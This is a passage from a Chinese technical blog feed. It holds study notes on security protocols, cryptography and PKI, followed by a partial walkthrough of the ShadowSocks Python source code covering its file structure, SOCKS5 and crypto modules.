Requirment(安全需求)</h4><ul><li>Confidentiality(机密性)：防止被未授权人员读取信息</li><li>Integrity(完整性)：保持数据一致完整</li><li>Availability(可用性)：保持数据可用</li><li>Authentication(认证性)：保证人的身份正确</li><li>Non-repudiation(抗抵赖性)：确保数据不会被否定</li><li>Access control(访问控制)：防止未授权人员访问</li></ul><p>前三个被称为信息安全的CIA三要素</p></blockquote><h4 id="攻击的类型"><a href="#攻击的类型" class="headerlink" title="攻击的类型"></a>攻击的类型</h4><p><img src="https://magic-king.net/images/loading.gif" data-original="Security-Protocols-and-Standards/attack-types.png" alt></p><p>攻击分为两种类型：主动攻击和被动攻击</p><ul><li>被动攻击(Passive attack)：只能观察到流量或数据</li><li>主动攻击(Active attack)：可以主动修改流量或数据，比如中间人攻击。通常比较难实现，但是攻击十分有效，比如邮件的伪造，TCP/IP spoofing（IP欺骗），session hijacking（会话劫持）</li></ul><h4 id="安全服务"><a href="#安全服务" class="headerlink" title="安全服务"></a>安全服务</h4><p>ISO7498-2中定义了5大类可选的安全服务：</p><ul><li>认证性</li><li>访问控制</li><li>数据保密性</li><li>数据完整性</li><li>不可否认性</li></ul><h4 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h4><p>三大基本设施</p><ul><li>Encryption(加密)</li><li>Digital signatures(数字签名)</li><li>Checksums/hash algorithm(校验码/哈希算法)</li></ul><p>一种安全服务可能结合多种安全机制</p><h3 id="Security-Protocol"><a href="#Security-Protocol" class="headerlink" title="Security Protocol"></a>Security Protocol</h3><p><img src="https://magic-king.net/images/loading.gif" data-original="Security-Protocols-and-Standards/securityProtocols.png" alt></p><p>一种安全协议里包含一个或多个安全服务，而安全服务提供多种安全机制，在一个安全机制里可能用到多种算法（机制由算法实现），这就是<strong>协议与服务、机制、算法之间的关系</strong></p><p>对称加密由加密过程可分为：流加密(Stream cipher)和块加密(Block cipher)</p><p>Key Distribution Center(KDC)：密钥分发中心</p><h4 id="块加密方式"><a href="#块加密方式" class="headerlink" title="块加密方式"></a>块加密方式</h4><ul><li>Electronic Code Book(ECB)</li><li>Cipher Block Chain(CBC)</li><li>Cipher Feed Back(CFB)</li><li>Output Feed Back(OFB)</li><li>Counter(CTR)</li></ul><h4 id="公钥应用"><a href="#公钥应用" class="headerlink" title="公钥应用"></a>公钥应用</h4><ul><li>加解密</li><li>数字签名</li><li>密钥交换</li></ul><h5 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h5><ul><li>RSA</li><li>DH：key exchange algorithm</li><li>Elgamal</li><li>DSA</li></ul><h3 id="对称加密vs非对称加密"><a href="#对称加密vs非对称加密" class="headerlink" title="对称加密vs非对称加密"></a>对称加密vs非对称加密</h3><h4 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h4><ul><li>优点<ul><li>速度快、处理量大，适用于对应用数据的直接加密</li><li>加密密钥长度短，一般为40bit至128bit</li><li>还可以构造各种加密体制，如产生伪随机数、hash函数</li></ul></li><li>缺点<ul><li>密钥在双方都要一致、保密，传递较难</li><li>大型网络中密钥量大，难以管理，一般需要TTP</li><li>密钥需要经常更换</li></ul></li></ul><h4 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h4><ul><li>优点<ul><li>只有私钥保密，公钥公开</li><li>网络上的密钥管理只需要一个功能性TTP，而不是一个绝对安全的TTP，不需在线，可以离线</li><li>密钥生命周期相对较长</li><li>许多公钥方案可以产生数字签名机制</li><li>在大型网络上，所需的密钥相对较少</li></ul></li><li>缺点<ul><li>速度慢、处理量少，适用于密钥交换</li><li>密钥长度相对较长</li><li>安全性没有得到理论性证明</li><li>历史较短</li></ul></li></ul><h4 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h4><p>弱碰撞：给定x，寻找y，使得<code>H(y) =  H(x)</code></p><p>强碰撞：寻找x，y，使得<code>H(y) = H(x)</code></p><h4 id="Message-Authertication-Code-MAC"><a href="#Message-Authertication-Code-MAC" class="headerlink" title="Message Authertication Code(MAC)"></a>Message Authertication Code(MAC)</h4><p>消息认证码MAC</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Security-Protocols-and-Standards/MAC.png" alt></p><h4 id="数字签名（Digital-Signature）"><a href="#数字签名（Digital-Signature）" class="headerlink" title="数字签名（Digital Signature）"></a>数字签名（Digital Signature）</h4><h4 id="Key-Management"><a href="#Key-Management" class="headerlink" title="Key Management"></a>Key Management</h4><p>密码学最难的部分</p><p>密钥分为两种</p><ul><li>Short-term session keys(ephemeral keys)</li><li>Long-term keys<ul><li>认证</li><li>加密</li></ul></li></ul><h5 id="主要问题"><a href="#主要问题" class="headerlink" title="主要问题"></a>主要问题</h5><ul><li>Distributing keys(分发密钥)<ul><li>获取其他人的公钥</li><li>分发自己的公钥</li></ul></li><li>Establishing a shared key with another party(与另一方建立共享密钥)<ul><li>保密性</li><li>认证性</li></ul></li><li>Key storage<ul><li>安全存储密钥</li></ul></li><li>Revocation<ul><li>Revoking published keys：撤销公钥</li><li>Determining whether a published key is still valid：验证公钥的可用性</li></ul></li></ul><h5 id="Key-Lifetime-and-Key-Compromise"><a href="#Key-Lifetime-and-Key-Compromise" class="headerlink" title="Key Lifetime and Key Compromise"></a>Key Lifetime and Key Compromise</h5><p>公钥有着更长的生命周期(decades)</p><p>私钥或者传统密钥有着更短的生命周期(a year or two)</p><h5 id="Key-Distribution-Problem"><a href="#Key-Distribution-Problem" class="headerlink" title="Key Distribution Problem"></a>Key Distribution Problem</h5><p>！中间人攻击</p><p>解决办法：CA（Certification authority）</p><ul><li>对称加密密钥管理认证：KDC/KEY DISTRIBUTION CENTER</li><li>非对称加密密钥管理认证：CA/CERTIFICATE AUTHORITY</li></ul><h4 id="Data-Format"><a href="#Data-Format" class="headerlink" title="Data Format"></a>Data Format</h4><p>一种正确的加密内容的格式如下图所示</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Security-Protocols-and-Standards/dataFormat1.png" alt></p><p>PGP和S/MIME，SSL，SSH的格式不同于他们的 bit-bagging format</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Security-Protocols-and-Standards/dataFormat2.png" alt></p><h4 id="Security-Protocol：Layers"><a href="#Security-Protocol：Layers" class="headerlink" title="Security Protocol：Layers"></a>Security Protocol：Layers</h4><p>层次越高，就越容易部署应用；层次越低，数据就越透明</p><p><img src="https://magic-king.net/images/loading.gif" data-original="Security-Protocols-and-Standards/Layers.png" alt></p><h4 id="PKI（Public-Key-Infrastructure）"><a href="#PKI（Public-Key-Infrastructure）" class="headerlink" title="PKI（Public Key Infrastructure）"></a>PKI（Public Key Infrastructure）</h4><p>Internet安全系统解决方案，PKI采用数字证书机制管理公钥，通过第三方可信机构CA，把用户的公钥和身份信息进行有效捆绑，在Internet上有效验证用户的身份</p><p>国际标准PKIX：系统化、标准化</p><p>PKIX系列标准(Public Key Infrastructure on X.509)是由因特网网络工程技术小组的PKI小组制定，PKIX的标准化是建立互操作的基础。标准主要定义基于X.509的PKI框架模型，并以RFC形式发布</p><hr><p>安全：可靠性==》可靠性（网课的可靠性和安全性，没有可靠性，安全性没用）</p><p>安全协议与标准</p><p>协议：至少两方参与</p><p>网络协议的三要素：语法、语义、同步</p><p>围绕PKI的相关协议和理论</p><p>PKI：安全基础设施：Public Key Infrastructure</p><ul><li>基础设施协议</li><li>应用的协议</li></ul><blockquote><p>参考书：</p><p>PKI技术，荆继武，冯登国，科学出版社（偏理论</p><p>PKI原理与技术，谢冬青，清华大学出版社</p><p>PKI/CA与数字证书技术大全，张明德，刘伟，电子工业出版社（偏实践</p></blockquote><hr><p>可靠性和安全性的区别，其两者之间的包含性</p><p>面对问题需要系统的方法</p><blockquote><ul><li><p>环境安全</p></li><li><p>物理安全</p></li><li>物理网路</li><li>平台可靠性</li></ul></blockquote><p>安全——木桶理论</p><p>安全：生态的概念</p><p> 蝴蝶效应</p><p>黑天鹅理论</p><p>CIA三定理</p><p>被动攻击&amp;主动攻击</p><ul><li>被动攻击：可以监控数据</li><li>主动攻击：可以修改数据</li></ul><p>属性证书</p><p>身份证书</p><p>两者结合解决身份认证问题</p><p>协议：至少两方，交互信息、有限交互</p><p>怎么打padding</p><hr><p>公钥算法的功能</p><ul><li>加解密：保密性</li><li>数字签名：认证性</li><li>密钥交换：密钥管理</li></ul><ul><li>RSA：数字签名加解密</li><li>DH：密钥交换</li><li><p>Elgamal</p></li><li><p>DSA：基于离散对数的</p></li><li>椭圆曲线</li></ul><hr><p>IPV4，网络低层没有考虑安全</p><p>我国IPv4的地址匮乏，主网模式下大量NAT、内网穿透的使用，大力推广IPV6</p><p>PKI：Public Key Instruction</p><p>密码学五大奠基：</p><ul><li>对称密码</li><li>公钥加密</li><li>数字签名</li><li>HASH</li><li>MAC</li></ul><p>协议：网络协议&amp;应用协议</p><p>报告：中国PKI技术和应用发展，调研</p><p>网站学习：技术体术标准化，商密SM系列标准</p><p>报告：综述、涉及了什么</p><p>ddl:10day</p><hr><h4 id="网络安全基础设施"><a href="#网络安全基础设施" class="headerlink" title="网络安全基础设施"></a>网络安全基础设施</h4><ul><li>提供网络安全基本框架，可以被组织内任何需要安全服务的应用和对象使用</li><li>接入点统一的，便于使用</li></ul><h4 id="安全登录（认证）"><a href="#安全登录（认证）" class="headerlink" title="安全登录（认证）"></a>安全登录（认证）</h4><p>认证：确认一个实体确实是其向其他人声明的</p><p>用户标识&amp;认证信息&amp;防止口令截取&amp;监听&amp;重放攻击</p><p>选择好口令：长度，质量，经常修改</p><p>口令不再网络上直接传输</p><blockquote><ul><li>认证：<br>①Kerboeros：纯密码<pre><code>基于用户名/口令</code></pre>②数字证书</li></ul><ul><li>授权：是一个访问控制问题<br>对资源控制</li></ul></blockquote><p>Kerberos</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> StudyNote </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ShadowSocks-SourceCode-Learning</title>
      <link href="/2020/01/30/ShadowSocks-SourceCode-Learning/"/>
      <url>/2020/01/30/ShadowSocks-SourceCode-Learning/</url>
      
        <content type="html"><![CDATA[<h1 id="关于ShadowSocks的学习"><a href="#关于ShadowSocks的学习" class="headerlink" title="关于ShadowSocks的学习"></a>关于ShadowSocks的学习</h1><p>对待科学上网的工具，既然开源的话，就要有科学的精神对其进行学习。</p><p>其GitHub官方网址：<a href="https://github.com/shadowsocks" target="_blank" rel="noopener">https://github.com/shadowsocks</a></p><p>本文学习的源码来自：<a href="https://github.com/shadowsocks/shadowsocks" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks</a></p><p>版本是2.9.1的python版本</p><blockquote><p>参考：</p><p><a href="https://bitmingw.com/2017/03/25/shadowsocks-code-analysis-overview/" target="_blank" rel="noopener">shadowsocks 源码分析：整体结构</a></p><p><a href="https://segmentfault.com/a/1190000011862912" target="_blank" rel="noopener">你也能写个 Shadowsocks</a></p><p><a href="https://huiliu.github.io/2016/03/19/shadowsocks.html" target="_blank" rel="noopener">shadowsocks源码分析：ssserver</a></p><p><a href="https://0x01.io/2016/02/28/shadowsocks-源码阅读/" target="_blank" rel="noopener">shadowsocks 源码阅读</a></p><p><a href="https://loggerhead.me/posts/shadowsocks-yuan-ma-fen-xi-xie-yi-yu-jie-gou.html" target="_blank" rel="noopener">Shadowsocks 源码分析——协议与结构</a></p><p><a href="[https://blog.gfkui.com/2018/04/29/shadowsocks%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/index.html](https://blog.gfkui.com/2018/04/29/shadowsocks客户端源码分析/index.html">shadowsocks客户端源码分析</a>)</p></blockquote><p>这个世界上不应该仅有一种声音。</p><p>但是。。。</p><h2 id="关于SOCKS协议"><a href="#关于SOCKS协议" class="headerlink" title="关于SOCKS协议"></a>关于SOCKS协议</h2><p>ShadowSocks的数据传输时建立在SOCK5协议之上，SOCKS5 是 TCP/IP 层面的网络代理协议。</p><p>ss-server 端解密出来的数据就是采用 SOCKS5 协议封装的，通过 SOCKS5 协议 ss-server 端能读出本机软件想访问的服务的真正地址以及要传输的原数据</p><blockquote><p>关于Socks5学习：</p><p><a href="http://zhihan.me/network/2017/09/24/socks5-protocol/" target="_blank" rel="noopener">socks5 协议简介</a></p><p><a href="https://www.cnblogs.com/yinzhengjie/p/7357860.html" target="_blank" rel="noopener">HTTP协议和SOCKS5协议</a></p><p><a href="https://zh.wikipedia.org/wiki/SOCKS" target="_blank" rel="noopener">socks-wiki</a></p><p><a href="https://www.ietf.org/rfc/rfc1928.txt" target="_blank" rel="noopener">rfc1928</a></p><p><a href="https://www.ietf.org/rfc/rfc1929.txt" target="_blank" rel="noopener">rfc1929</a></p></blockquote><p>socks是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。根据OSI七层模型来划分，SOCKS属于会话层协议，位于表示层与传输层之间。</p><p>socks5协议将socks4协议扩展：</p><ul><li>对UDP连接的支持</li><li>多种用户身份验证方式和通信加密方式</li><li>将寻址方式扩展为包含域名和v6 IP地址（即IPv6）</li></ul><p>socks协议的设计初衷是在保证网络隔离的情况下，提高部分人员的网络访问权限。但是他却被发现了新的用途：突破网络通信限制，这和该协议的设计初衷正好相反。</p><h4 id="Socks5协议流程"><a href="#Socks5协议流程" class="headerlink" title="Socks5协议流程"></a>Socks5协议流程</h4><p><img src="https://magic-king.net/images/loading.gif" data-original="ShadowSocks-SourceCode-Learning/1.png" alt></p><p>建立TCP连接后，客户端需要先发送请求来协商版本及认证方式，详细可见<a href="https://www.ietf.org/rfc/rfc1928.txt" target="_blank" rel="noopener">rfc1928</a></p><h2 id="Shadowsocks原理"><a href="#Shadowsocks原理" class="headerlink" title="Shadowsocks原理"></a>Shadowsocks原理</h2><p><img src="https://magic-king.net/images/loading.gif" data-original="ShadowSocks-SourceCode-Learning/2.png" alt></p><ul><li><strong>PC</strong>是需要利用shadowsocks代理的应用；</li><li><strong>SS Local</strong>：为shadowsocks客户端，通常运行在PC/手机上（也可以运行在任务PC可 以到达的位置），用于与shadowsocks服务端建立连接。</li><li><strong>GFW</strong>：你懂的</li><li><strong>ss server</strong>：shadowsocks服务端，与ss local通讯，完成ss local请 求的访问，并将返回数据加密返回给ss local</li></ul><p>混淆时实在ClientHello阶段，即第1阶段时进行混淆，加入jiade目标网址</p><h2 id="shadowsocks源码分析"><a href="#shadowsocks源码分析" class="headerlink" title="shadowsocks源码分析"></a>shadowsocks源码分析</h2><p>shadowsocks文件树形结构图如下</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">├── .gitignore</span><br><span class="line">├── .travis.yml</span><br><span class="line">├── CHANGES</span><br><span class="line">├── CONTRIBUTING.md</span><br><span class="line">├── debian</span><br><span class="line">│   ├── changelog</span><br><span class="line">│   ├── compat</span><br><span class="line">│   ├── config.json</span><br><span class="line">│   ├── control</span><br><span class="line">│   ├── copyright</span><br><span class="line">│   ├── docs</span><br><span class="line">│   ├── init.d</span><br><span class="line">│   ├── install</span><br><span class="line">│   ├── rules</span><br><span class="line">│   ├── shadowsocks.default</span><br><span class="line">│   ├── shadowsocks.manpages</span><br><span class="line">│   ├── <span class="keyword">source</span></span><br><span class="line">│   │   └── format</span><br><span class="line">│   ├── sslocal.<span class="number">1</span></span><br><span class="line">│   └── ssserver.<span class="number">1</span></span><br><span class="line">├── Dockerfile</span><br><span class="line">├── LICENSE</span><br><span class="line">├── MANIFEST.in</span><br><span class="line">├── README.md</span><br><span class="line">├── README.rst</span><br><span class="line">├── setup.<span class="keyword">py</span></span><br><span class="line">├── shadowsocks</span><br><span class="line">│   ├── asyncdns.<span class="keyword">py</span></span><br><span class="line">│   ├── common.<span class="keyword">py</span></span><br><span class="line">│   ├── crypto</span><br><span class="line">│   │   ├── __init__.<span class="keyword">py</span></span><br><span class="line">│   │   ├── openssl.<span class="keyword">py</span></span><br><span class="line">│   │   ├── rc4_md5.<span class="keyword">py</span></span><br><span class="line">│   │   ├── sodium.<span class="keyword">py</span></span><br><span class="line">│   │   ├── table.<span class="keyword">py</span></span><br><span class="line">│   │   └── util.<span class="keyword">py</span></span><br><span class="line">│   ├── daemon.<span class="keyword">py</span></span><br><span class="line">│   ├── encrypt.<span class="keyword">py</span></span><br><span class="line">│   ├── eventloop.<span class="keyword">py</span></span><br><span class="line">│   ├── __init__.<span class="keyword">py</span></span><br><span class="line">│   ├── local.<span class="keyword">py</span></span><br><span class="line">│   ├── lru_cache.<span class="keyword">py</span></span><br><span class="line">│   ├── manager.<span class="keyword">py</span></span><br><span class="line">│   ├── server.<span class="keyword">py</span></span><br><span class="line">│   ├── <span class="keyword">shell</span>.<span class="keyword">py</span></span><br><span class="line">│   ├── tcprelay.<span class="keyword">py</span></span><br><span class="line">│   └── udprelay.<span class="keyword">py</span></span><br><span class="line">├── tests</span><br><span class="line">├─tests</span><br><span class="line">│  ├──  aes-cfb1.json</span><br><span class="line">│  ├──  aes-cfb8.json</span><br><span class="line">│  ├──  aes-ctr.json</span><br><span class="line">│  ├──  aes.json</span><br><span class="line">│  ├──  assert.<span class="keyword">sh</span></span><br><span class="line">│  ├──  chacha20-ietf.json</span><br><span class="line">│  ├──  chacha20.json</span><br><span class="line">│  ├──  client-multi-server-ip.json</span><br><span class="line">│  ├──  coverage_server.<span class="keyword">py</span></span><br><span class="line">│  ├──  fastopen.json</span><br><span class="line">│  ├──  gen_multiple_passwd.<span class="keyword">py</span></span><br><span class="line">│  ├──  graceful.json</span><br><span class="line">│  ├──  graceful_cli.<span class="keyword">py</span></span><br><span class="line">│  ├──  graceful_server.<span class="keyword">py</span></span><br><span class="line">│  ├──  ipv6-client-side.json</span><br><span class="line">│  ├──  ipv6.json</span><br><span class="line">│  ├──  jenkins.<span class="keyword">sh</span></span><br><span class="line">│  ├──  nose_plugin.<span class="keyword">py</span></span><br><span class="line">│  ├──  rc4-md5-ota.json</span><br><span class="line">│  ├──  rc4-md5.json</span><br><span class="line">│  ├──  salsa20-ctr.json</span><br><span class="line">│  ├──  salsa20.json</span><br><span class="line">│  ├──  server-dnsserver.json</span><br><span class="line">│  ├──  server-multi-passwd-client-side.json</span><br><span class="line">│  ├──  server-multi-passwd-<span class="built_in">empty</span>.json</span><br><span class="line">│  ├──  server-multi-passwd-performance.json</span><br><span class="line">│  ├──  server-multi-passwd-table.json</span><br><span class="line">│  ├──  server-multi-passwd.json</span><br><span class="line">│  ├──  server-multi-ports.json</span><br><span class="line">│  ├──  setup_tc.<span class="keyword">sh</span></span><br><span class="line">│  ├──  table.json</span><br><span class="line">│  ├──  test.<span class="keyword">py</span></span><br><span class="line">│  ├──  test_command.<span class="keyword">sh</span></span><br><span class="line">│  ├──  test_daemon.<span class="keyword">sh</span></span><br><span class="line">│  ├──  test_graceful_restart.<span class="keyword">sh</span></span><br><span class="line">│  ├──  test_large_file.<span class="keyword">sh</span></span><br><span class="line">│  ├──  test_udp_src.<span class="keyword">py</span></span><br><span class="line">│  ├──  test_udp_src.<span class="keyword">sh</span></span><br><span class="line">│  ├──  workers.json</span><br><span class="line">│  │</span><br><span class="line">│  ├─libsodium</span><br><span class="line">│  │    └── install.<span class="keyword">sh</span></span><br><span class="line">│  │</span><br><span class="line">│  └─socksify</span><br><span class="line">│       ├── install.<span class="keyword">sh</span></span><br><span class="line">│       └── socks.<span class="keyword">conf</span></span><br><span class="line">|</span><br><span class="line">└── utils</span><br><span class="line">    ├── autoban.<span class="keyword">py</span></span><br><span class="line">    ├── fail2ban</span><br><span class="line">    │   └── shadowsocks.<span class="keyword">conf</span></span><br><span class="line">    └── README.md</span><br></pre></td></tr></table></figure><p>有过python工程经验（类似于Flask）很明显得知，工程核心代码位于<code>shadowsocks</code>里，其他提供了打包测试功能。</p><p>对于核心代码：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">├── shadowsocks</span><br><span class="line">│   ├── asyncdns.py</span><br><span class="line">│   ├── common.py</span><br><span class="line">│   ├── crypto</span><br><span class="line">│   │   ├── __init__.py</span><br><span class="line">│   │   ├── openssl.py</span><br><span class="line">│   │   ├── rc4_md5.py</span><br><span class="line">│   │   ├── sodium.py</span><br><span class="line">│   │   ├── <span class="selector-tag">table</span>.py</span><br><span class="line">│   │   └── util.py</span><br><span class="line">│   ├── daemon.py</span><br><span class="line">│   ├── encrypt.py</span><br><span class="line">│   ├── eventloop.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── local.py</span><br><span class="line">│   ├── lru_cache.py</span><br><span class="line">│   ├── manager.py</span><br><span class="line">│   ├── server.py</span><br><span class="line">│   ├── shell.py</span><br><span class="line">│   ├── tcprelay.py</span><br><span class="line">│   └── udprelay.py</span><br></pre></td></tr></table></figure><ul><li><strong>tcprelay.py</strong>提供了类TCPRelay, TCPRelayHandler来处理TCP代理连接</li><li><strong>udprelay.py</strong>提供了类UDPRelay，UDPRelayHandler来处理UDP代理连接</li><li><strong>eventloop.py</strong>提供了类EventLoop对<code>epoll</code>, <code>kqueue</code>, <code>select</code>方法的包装，提供统一的IO复用接口</li><li><strong>encrypt.py</strong>提供加密解密相关接口<ul><li>具体的加密实现在crypto文件夹中实现</li></ul></li><li><strong>daemon.py</strong>：用于实现守护进程；</li><li><strong>shell.py</strong>：读取命令行参数，检查配置</li><li><strong>common.py</strong>包含一些通用接口</li><li><strong>lru_cache.py</strong>：实现了LRU缓存</li><li><strong>server.py</strong>是服务端入口ssserver；</li><li><strong>local.py</strong>是客户端入口sslocal；</li></ul><p>可以看到，基本每个文件中，都有这一行的引入模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> absolute_import, division, print_function, \</span><br><span class="line">    with_statement</span><br></pre></td></tr></table></figure><p>这个模块是为了引入下一版本的python特性，提高代码对最新python版本的兼容性。</p><p>在<code>setup.py</code>中可见，该代码可在python2.6，python2.7以及python3.3，python3.4及以上版本运行，因此会引入该库来解决兼容性问题</p><p>主要是为了兼容<code>import</code>，除法<code>/</code>，<code>print</code>，<code>with</code></p><blockquote><blockquote><p>about <code>__future__</code>：</p><p><a href="https://www.liaoxuefeng.com/wiki/897692888725344/923030465280480" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/897692888725344/923030465280480</a></p></blockquote><ul><li>import</li></ul><p><a href="https://blog.csdn.net/caiqiiqi/article/details/51050800" target="_blank" rel="noopener">https://blog.csdn.net/caiqiiqi/article/details/51050800</a></p><p>Python 2.4或之前, Python会先查找当前目录下有没有string.py, 若找到了，则引入该模块，然后你在main.py中可以直接用string了。</p><p>而引入absolute_import 可以先从系统库中引用。</p><ul><li><code>/</code></li></ul><p>python2中，<code>/</code>为整除，而python3中，整除是<code>//</code>。</p><ul><li>print</li></ul><p>python2中，print是一个语法结构，而python3中，print是一个内置函数，有多个参数</p><p>即明显地，python2中，<code>print &#39;hello world&#39;</code>；而在python3中，<code>print(&#39;hello world&#39;)</code></p><ul><li>with</li></ul><p><a href="http://www.voidcn.com/article/p-wrgsfqdl-boq.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-wrgsfqdl-boq.html</a></p><p>python2.5需要引入的语法，没有看到2和3有什么区别，应该是为了兼容所引入的。</p><p>在stackoverflow的一个问题里说的很清楚了：<a href="https://stackoverflow.com/questions/3791903/which-python-version-needs-from-future-import-with-statement" target="_blank" rel="noopener">https://stackoverflow.com/questions/3791903/which-python-version-needs-from-future-import-with-statement</a></p><p>version&lt;=2.4不支持，version2.5需要这个import with_statement，在version&gt;=2.6的时候，python已经将with内嵌进去了。</p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="openssl-py"><a href="#openssl-py" class="headerlink" title="openssl.py"></a>openssl.py</h4><p><code>from ctypes import ...</code>：ctypes是python和C的桥梁，ctypes是python标准库之一，里面引入了许多C的函数以及变量类型</p><blockquote><p><a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a></p></blockquote><p><code>__all__ = [&#39;cipher&#39;]</code>规定了对外暴露的接口</p><blockquote><p><a href="https://www.cnblogs.com/wxlog/p/10566628.html" target="_blank" rel="noopener">https://www.cnblogs.com/wxlog/p/10566628.html</a></p></blockquote><p>由此直接看到下面的<code>cipher</code>，里面定义了ss的加密方法</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ShadowSocks-SourceCode-Learning/3.png" alt></p><p>这也就是crypto模块对外提供的所有加密方法</p><p><code>def load_openssl()</code>方法用来寻找运行系统中的openssl库</p><p>全局变量<code>libcrypto</code>用来存放打开的openssl对象</p><p>定义了一个<code>OpenSSLCrypto</code>对象用来加密</p><p>函数<code>def run_method(method)</code>用来调用该对象进行加解密</p><p>然后下面有一堆的<code>test</code>函数</p><h4 id="rc4-md5-py"><a href="#rc4-md5-py" class="headerlink" title="rc4_md5.py"></a>rc4_md5.py</h4><p>直接调用<code>hashlib</code>模块的md5进行运算，没啥好说的</p><h4 id="sodium-py"><a href="#sodium-py" class="headerlink" title="sodium.py"></a>sodium.py</h4><p>soudium是钠的意思，好像也是在英语中代表着纯盐</p><blockquote><p><a href="https://blog.abyss.moe/archives/24/" target="_blank" rel="noopener">https://blog.abyss.moe/archives/24/</a></p><p><a href="https://github.com/jedisct1/libsodium" target="_blank" rel="noopener">https://github.com/jedisct1/libsodium</a></p></blockquote><p>但是查了下<code>libsodium</code>是一个新的软件库，为了加解密、签名、哈希等。是一个现代的密码库，着重于移植性、安全性，是NaCl(Networking and Cryptographt library)的一个分支==&gt;<a href="http://nacl.cr.yp.to/" target="_blank" rel="noopener">http://nacl.cr.yp.to/</a></p><p>这里面也是实现了三种加密（都没听过，往后有时间可以了解一下</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ShadowSocks-SourceCode-Learning/4.png" alt></p><h4 id="util-py"><a href="#util-py" class="headerlink" title="util.py"></a>util.py</h4><p>基本在Crypto文件夹下的所有文件基本都引用了这个模块</p><p>这模块提供了①查找dll库的函数：<code>def find_library_nt(name)</code>、<code>def find_library(possible_lib_names, search_symbol, library_name)</code><br>②测试加解密函数：<code>def run_cipher(cipher, decipher)</code><br>③检验引入的库是否存在：<code>def test_find_library()</code></p><p>其main函数主要是为了检测是否引入所有所需的dll库，所以引入这个模块可确保其他编写加密的文件不会出现无法调用库的情况</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ShadowSocks-SourceCode-Learning/5.png" alt></p><h4 id="table-py"><a href="#table-py" class="headerlink" title="table.py"></a>table.py</h4><p>好像是一种单表替换加密</p><h3 id="init-py"><a href="#init-py" class="headerlink" title="__init__.py"></a>__init__.py</h3><p>一个很正常的init文件，跟crypto的__init__.py差不多</p><h3 id="asyncdns-py"><a href="#asyncdns-py" class="headerlink" 